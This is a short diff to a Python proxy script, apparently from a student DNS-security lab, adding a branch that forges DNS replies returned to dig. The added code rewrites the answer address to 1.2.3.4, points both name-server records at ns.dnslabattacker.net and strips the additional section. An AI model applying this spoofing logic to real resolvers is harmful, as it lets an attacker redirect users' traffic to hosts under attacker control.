@@ -55,6 +55,21 @@ if __name__ == "__main__":
             exit(1)
         else:
             print("Successfuly received non-zero data from bind.")
+            
+        if SPOOF:
+            # Use the proxy created in Part 2 to intercept and forge DNS replies
+            responseBind = DNS(responseBind)
+            
+            # Change the IP address to 1.2.3.4 instead
+            responseBind.an[0].rdata = '1.2.3.4'
+            
+            # Change its name servers to ns.dnslabattacker.net
+            responseBind.ns[0].rdata = 'ns.dnslabattacker.net'
+            responseBind.ns[1].rdata = 'ns.dnslabattacker.net'
+            
+            # Remove the additional section
+            responseBind.arcount = 0
+              
         # Reply to dig
         serverSide.sendto(bytes(responseBind), digAddress)
         print("Successfully replied back to dig.")
